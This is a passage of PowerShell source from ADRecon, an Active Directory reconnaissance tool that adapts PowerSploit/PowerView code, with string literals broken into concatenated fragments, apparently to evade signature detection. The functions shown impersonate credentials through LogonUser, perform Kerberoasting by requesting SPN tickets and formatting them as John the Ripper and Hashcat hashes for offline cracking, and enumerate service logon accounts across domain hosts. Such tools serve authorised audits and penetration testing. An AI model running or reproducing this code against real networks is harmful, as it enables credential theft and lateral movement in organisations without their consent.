        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate "runas.exe /netonly" functionality
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)
        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    # actually impersonate the token from LogonUser()
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ('[Get-ADR-U'+'s'+'e'+'rIm'+'perso'+'nation'+'] Alt'+'ernate'+' crede'+'nt'+'i'+'als s'+'ucce'+'s'+'sfu'+'lly'+' impe'+'rsonated')
    $LogonTokenHandle
}

# Modified Invoke-RevertToSelf function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRRevertToSelf
{
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle returned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters[('Tok'+'en'+'H'+'andle')])
    {
        Write-Warning ('[G'+'et-A'+'DR'+'Reve'+'r'+'t'+'To'+'S'+'el'+'f'+'] '+'Rev'+'e'+'rti'+'ng tok'+'en'+' impersonatio'+'n '+'and'+' cl'+'osing'+' Log'+'o'+'nUser'+'() toke'+'n handle')
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf()
    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    Write-Verbose ('[Get-ADRR'+'evert'+'ToSel'+'f] '+'To'+'ken im'+'perso'+'nation successfull'+'y r'+'e'+'verte'+'d')
}

# Modified Get-DomainSPNTicket function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRSPNTicket
{
<#
<#
.SYNOPSIS
    Request the kerberos ticket for a specified service principal name (SPN).

    Author: machosec, Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf

.DESCRIPTION
    This function will either take one SPN strings, and will request a kerberos ticket for the given SPN using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted portion of the ticket is then extracted and output in either crackable Hashcat format.

.PARAMETER UserSPN
    [string]
    Service Principal Name.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null = [Reflection.Assembly]::LoadWithPartialName(('S'+'y'+'s'+'tem.Ident'+'i'+'tyModel'))
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning ('[Get-AD'+'R'+'SPNTi'+'ck'+'e'+'t] '+'Error'+' '+'req'+'u'+'e'+'sting '+'tick'+'et '+'for'+' '+'S'+'PN '+"$UserSPN")
        Write-Warning "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.GetRequest()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
        # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
            If ($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ('A4'+'82'))
            {
                Write-Warning ('[Get-ADRSP'+'N'+'T'+'i'+'cket'+'] '+'Erro'+'r '+'pa'+'rs'+'ing '+'ciphe'+'rt'+'e'+'xt '+'f'+'or '+'th'+'e '+'S'+'PN '+' '+('iZS(iZ'+'S'+'T'+'ic'+'ket.'+'S'+'ervicePrincipalN'+'ame)'+'.').rEPLAcE(([cHAr]105+[cHAr]90+[cHAr]83),'$')) # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
            $Hash = $null
        }
    }
    $Obj = New-Object PSObject
    $Obj | Add-Member -MemberType NoteProperty -Name ('Ser'+'vi'+'cePrincip'+'alName') -Value $Ticket.ServicePrincipalName
    $Obj | Add-Member -MemberType NoteProperty -Name ('Etyp'+'e') -Value $Etype
    $Obj | Add-Member -MemberType NoteProperty -Name ('Ha'+'sh') -Value $Hash
    Return $Obj
}

Function Get-ADRKerberoast
{
<#
.SYNOPSIS
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.DESCRIPTION
    Returns all user service principal name (SPN) hashes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter ('(&(!obj'+'ec'+'t'+'Cl'+'ass=comput'+'er'+')(servic'+'ePrin'+'ci'+'pa'+'lNam'+'e'+'=*)('+'!u'+'serAc'+'countC'+'ontrol:1.2'+'.840.1'+'13556.1.4.80'+'3'+':'+'=2'+'))') -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning ('[Get-'+'ADRK'+'er'+'bero'+'ast] Error wh'+'ile '+'enum'+'erating'+' Use'+'rSPN'+' Obj'+'ects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.servicePrincipalName)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Us'+'erna'+'me') -Value $_.sAMAccountName
                    $Obj | Add-Member -MemberType NoteProperty -Name ('ServicePrinc'+'ip'+'a'+'lN'+'ame') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.DistinguishedName.SubString($_.DistinguishedName.IndexOf(('D'+'C='))) -replace ('DC'+'='),'' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Joh'+'n') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Hash'+'ca'+'t') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(&('+'!'+'o'+'bje'+'ctCla'+'s'+'s=c'+'om'+'p'+'ut'+'er'+')(servicePrinc'+'i'+'p'+'alNa'+'me'+'=*)(!userA'+'cco'+'untControl:1.2.84'+'0.1'+'1'+'3556.1.4.803:=2'+'))')
        $ObjSearcher.PropertiesToLoad.AddRange((('di'+'st'+'ingu'+'ishe'+'dname'),('samacco'+'u'+'nt'+'nam'+'e'),('s'+'ervice'+'p'+'r'+'inci'+'palname'),('u'+'seraccou'+'ntcont'+'rol')))
        $ObjSearcher.SearchScope = ('Su'+'b'+'tree')
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-'+'A'+'DRKe'+'rb'+'ero'+'ast] Error'+' while'+' enumera'+'t'+'i'+'n'+'g '+'U'+'s'+'e'+'rSPN O'+'bject'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.Properties.serviceprincipalname)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name ('U'+'sern'+'ame') -Value $_.Properties.samaccountname[0]
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Ser'+'vic'+'ePrincip'+'alName') -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.Properties.distinguishedname[0].SubString($_.Properties.distinguishedname[0].IndexOf(('D'+'C='))) -replace ('D'+'C='),'' -replace ',','.'
                        # JohnTheRipper output format
                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        # hashcat output format
                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Jo'+'hn') -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name ('Ha'+'shca'+'t') -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}

# based on https://gallery.technet.microsoft.com/scriptcenter/PowerShell-script-to-find-6fc15ecb
Function Get-ADRDomainAccountsusedforServiceLogon
{
<#
.SYNOPSIS
    Returns all accounts used by services on computers in an Active Directory domain.

.DESCRIPTION
    Retrieves a list of all computers in the current domain and reads service configuration using Get-WmiObject.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {
            # scriptblock to retrieve service list form a remove machine
            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]
            #$Credential = [Management.Automation.PSCredential] $args[2]
            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object System.Net.Sockets.TcpClient
                $result = $tcpclient.BeginConnect($hostname,$port,$null,$null)
                $success = $result.AsyncWaitHandle.WaitOne($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                $success = $false
                $tcpclient.Close()
            }
            If ($success)
            {
                # PowerShellv2 does not support New-CimSession
                If ($PSVersionTable.PSVersion.Major -ne 2)
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption -Protocol DCOM)
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.EndConnect($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message) "
            }
            $warning
        }

        Function processCompletedJobs()
        {
            # reads service list from completed jobs,
            # updates $serviceAccount table and removes completed job

            $jobs = Get-Job -State Completed
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.GetType() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_.StartName) { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name ('Acco'+'u'+'nt') -Value $_.StartName
                            $Obj | Add-Member -MemberType NoteProperty -Name ('S'+'ervice'+' Na'+'me') -Value $_.Name
                            $Obj | Add-Member -MemberType NoteProperty -Name ('Syste'+'mNam'+'e') -Value $_.SystemName
                            If ($_.StartName.toUpper().Contains($currentDomain))
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ('Ru'+'n'+'nin'+'g '+'as Domain User') -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name ('Run'+'ning as Dom'+'a'+'in U'+'ser') -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.GetType() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Method -eq ('AD'+'WS'))
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning ('[Get-'+'ADRDomain'+'Ac'+'c'+'o'+'untsu'+'sed'+'f'+'orService'+'Logon'+'] Error g'+'etting '+'Do'+'main Cont'+'ext')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                $currentDomain = ""
                Write-Warning ('C'+'urre'+'nt Dom'+'ain c'+'o'+'ul'+'d n'+'ot be '+'ret'+'r'+'ieved.')
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and OperatingSystem -Like ('*Window'+'s'+'*') } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning ('['+'Get-'+'A'+'D'+'R'+'Domai'+'n'+'Ac'+'countsu'+'se'+'d'+'f'+'orS'+'erv'+'iceLogon] '+'Erro'+'r '+'whi'+'le '+'en'+'ume'+'ratin'+'g'+' Wi'+'ndows Co'+'mput'+'er Objects')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADComputers))
                Write-Verbose ('[*'+'] '+'Tota'+'l'+' '+'W'+'indows'+' '+'Ho'+'st'+'s: '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( $_.dnshostname )
	                {
                        $args = @($_.DNSHostName, $_.OperatingSystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity ('Re'+'t'+'rievin'+'g'+' d'+'ata'+' f'+'rom se'+'rvers') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
                        while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs

                Write-Progress -Activity ('Re'+'tr'+'ie'+'vi'+'ng da'+'ta f'+'rom '+'ser'+'vers') -Status ('Wai'+'tin'+'g'+' for '+'ba'+'ckgro'+'und jobs to'+' co'+'mp'+'let'+'e..'+'.') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ('Retriev'+'i'+'ng data fr'+'om'+' s'+'erv'+'e'+'rs') -Completed -Status ('A'+'ll D'+'one')
            }
        }

        If ($Method -eq ('LD'+'AP'))
        {
            $currentDomain = ([string]($objDomain.name)).toUpper()

            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = ('(&('+'s'+'amAccountType=8053'+'06'+'36'+'9)(!us'+'erAccountControl:1.'+'2.'+'840.113'+'55'+'6.1'+'.4.803:=2)(operatingSy'+'stem='+'*'+'Wi'+'ndows*))')
            $ObjSearcher.PropertiesToLoad.AddRange((('na'+'me'),('d'+'n'+'sh'+'ostname'),('op'+'er'+'ating'+'syst'+'em')))
            $ObjSearcher.SearchScope = ('Su'+'b'+'tree')

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('[Get-'+'ADRDom'+'a'+'in'+'Acco'+'untsus'+'edforService'+'Logon] Er'+'ror whi'+'le enu'+'merating Window'+'s Com'+'put'+'er'+' Ob'+'jects')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()

            If ($ADComputers)
            {
                # start data retrieval job for each server in the list
                # use up to $Threads threads
                $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADComputers))
                Write-Verbose ('[*'+'] '+'Tot'+'al'+' '+'Win'+'dows'+' '+'Ho'+'sts:'+' '+"$cnt")
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_.Properties.dnshostname )
	                {
                        $args = @($_.Properties.dnshostname, $_.Properties.operatingsystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity ('Retri'+'ev'+'in'+'g data'+' fro'+'m server'+'s') -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }

                # process remaining jobs
                Write-Progress -Activity ('Retrievi'+'n'+'g'+' data'+' '+'from'+' '+'servers') -Status ('Waiti'+'ng '+'for b'+'a'+'ckg'+'round jobs to '+'com'+'pl'+'ete...') -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity ('Retrie'+'ving data f'+'ro'+'m '+'servers') -Completed -Status ('All'+' D'+'one')
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function Remove-EmptyADROutputDir
{
<#
.SYNOPSIS
    Removes ADRecon output folder if empty.

.DESCRIPTION
    Removes ADRecon output folder if empty.

.PARAMETER ADROutputDir
    [string]
	Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        ('CS'+'V')
        {
            $CSVPath  = -join($ADROutputDir,'\',('CSV'+'-Fil'+'es'))
            If (!(Test-Path -Path $CSVPath\*))
            {
                Write-Verbose ('Re'+'mo'+'ved '+'Emp'+'ty '+'Dir'+'ec'+'tory '+"$CSVPath")
                Remove-Item $CSVPath
            }
        }
        ('X'+'ML')
        {
            $XMLPath  = -join($ADROutputDir,'\',('XM'+'L-File'+'s'))
            If (!(Test-Path -Path $XMLPath\*))
            {
                Write-Verbose ('Rem'+'ov'+'ed '+'Emp'+'ty '+'Di'+'recto'+'r'+'y '+"$XMLPath")
                Remove-Item $XMLPath
            }
        }
        ('J'+'SON')
        {
            $JSONPath  = -join($ADROutputDir,'\',('JS'+'ON'+'-'+'Files'))
            If (!(Test-Path -Path $JSONPath\*))
            {
                Write-Verbose ('Re'+'mo'+'ved '+'Em'+'pty '+'Dir'+'ecto'+'ry '+"$JSONPath")
                Remove-Item $JSONPath
            }
        }
        ('HT'+'ML')
        {
            $HTMLPath  = -join($ADROutputDir,'\',('H'+'TML-Fil'+'es'))
            If (!(Test-Path -Path $HTMLPath\*))
            {
                Write-Verbose ('Re'+'move'+'d '+'E'+'m'+'pty '+'D'+'i'+'r'+'ectory '+"$HTMLPath")
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path $ADROutputDir\*))
    {
        Remove-Item $ADROutputDir
        Write-Verbose ('Remove'+'d'+' '+'Emp'+'ty'+' '+'D'+'irectory'+' '+"$ADROutputDir")
    }
}

Function Get-ADRAbout
{
<#
.SYNOPSIS
    Returns information about ADRecon.

.DESCRIPTION
    Returns information about ADRecon.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date

.PARAMETER ADReconVersion
    [string]
    ADRecon Version.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER RanonComputer
    [string]
    Details of the Computer running ADRecon.

.PARAMETER TotalTime
    [string]
    TotalTime.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $true)]
        [string] $ADReconVersion,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [string] $RanonComputer,

        [Parameter(Mandatory = $true)]
        [string] $TotalTime
    )

    $AboutADRecon = @()

    $Version = $Method + (' Vers'+'i'+'on')

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $Username = $($Credential.UserName)
    }
    Else
    {
        $Username = $([Environment]::UserName)
    }

    $ObjValues = @(('Dat'+'e'), $($date), ('ADReco'+'n'), ('https://githu'+'b'+'.com/adreco'+'n/'+'A'+'DRecon'), $Version, $($ADReconVersion), ('R'+'an a'+'s user'), $Username, ('Ran '+'on comput'+'e'+'r'), $RanonComputer, ('E'+'x'+'ecut'+'ion T'+'ime (mi'+'ns)'), $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues.Count); $i++)
    {
        $Obj = New-Object PSObject
        $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ategor'+'y') -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ObjValues[$i+1]
        $i++
        $AboutADRecon += $Obj
    }
    Return $AboutADRecon
}

Function Invoke-ADRecon
{
<#
.SYNOPSIS
    Wrapper function to run ADRecon modules.

.DESCRIPTION
    Wrapper function to set variables, check dependencies and run ADRecon modules.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER Collect
    [array]
    Which modules to run; Tenant, Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, GroupChanges, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER OutputDir
    [string]
	Path for ADRecon output folder to save the CSV files and the ADRecon-Report.xlsx.

.PARAMETER DormantTimeSpan
    [int]
    Timespan for Dormant accounts. Default 90 days.

.PARAMTER PassMaxAge
    [int]
    Maximum machine account password age. Default 30 days

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.OUTPUTS
    STDOUT, CSV, XML, JSON, HTML and/or Excel file is created in the folder specified with the information.
#>
    param(
        [Parameter(Mandatory = $false)]
        [string] $GenExcel,

        [Parameter(Mandatory = $false)]
        [ValidateSet(('A'+'DWS'), ('LDA'+'P'))]
        [string] $Method = ('ADW'+'S'),

        [Parameter(Mandatory = $true)]
        [array] $Collect,

        [Parameter(Mandatory = $false)]
        [string] $DomainController = '',

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [int] $DormantTimeSpan = 90,

        [Parameter(Mandatory = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(Mandatory = $false)]
        [int] $PageSize = 200,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = ('v1.'+'24')
    Write-Output ('[*]'+' '+'ADRe'+'con'+' '+"$ADReconVersion "+'b'+'y '+'Pra'+'sh'+'a'+'nt '+'Mahaja'+'n '+'('+'@prashan'+'t3'+'535)')

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output ('['+'Inv'+'o'+'k'+'e-A'+'DRecon'+']'+' Invalid '+'Pat'+'h'+' ... Exiting')
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }

    # Suppress verbose output
    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = ('Silen'+'tl'+'yCo'+'nt'+'in'+'ue')
    Try
    {
        If ($PSVersionTable.PSVersion.Major -ne 2)
        {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem
            $computerdomainrole = ($computer).DomainRole
        }
        Else
        {
            $computer = Get-WMIObject win32_computersystem
            $computerdomainrole = ($computer).DomainRole
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = ('Standal'+'one '+'W'+'orkstatio'+'n')
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = ('Member W'+'or'+'ks'+'t'+'ation') }
        2
        {
            [string] $computerrole = ('S'+'t'+'anda'+'lone Ser'+'ver')
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
